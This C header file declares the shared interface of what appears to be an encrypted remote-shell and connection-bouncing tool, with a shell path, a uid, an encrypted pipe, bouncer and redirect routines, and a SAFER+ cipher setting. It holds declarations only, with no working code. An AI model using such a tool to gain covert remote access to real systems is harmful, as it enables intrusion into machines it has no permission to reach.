#ifndef _Q_H
#define _Q_H
#include "issl/types.h"
#include <issl.h>
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <stdio.h>
#ifdef __linux__
#include <stdlib.h>
#else
int rand (void);
long int random (void);
void bzero (void *s, int n);
void srandom (unsigned int seed);
void srand (unsigned int seed);
int atoi (const char *nptr);
int system (const char *string);
char *getpass (const char *prompt);
#endif
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdarg.h>
#include <netdb.h>
#include <errno.h>
#include <pwd.h>
#include <mix/mix.h>

#define BS	8192
#include "conf.h"
#ifndef MKPASS_C
#include "hash.h"
#endif

extern unsigned long __id;
extern char *q_shell;
extern int q_uid;

void cryptopipe (issl_t, char *, int);
void ssh (int, int, int, char **);
void bnc (int, issl_t, int, u32);
void red (int, int, int, int, char **, u32);
int csa_put (int, char *);
int csa_get (int);
void csa_key (void);
void isslterm (int, issl_t);

#ifdef WANT_LOGGING
#include <syslog.h>
void slog (char *,...);
#endif

/* AES Algorithm, one of: CAST256, MARS, SAFERP, TWOFISH, RIJNDAEL */
#define Q_ALG SAFERP
#endif
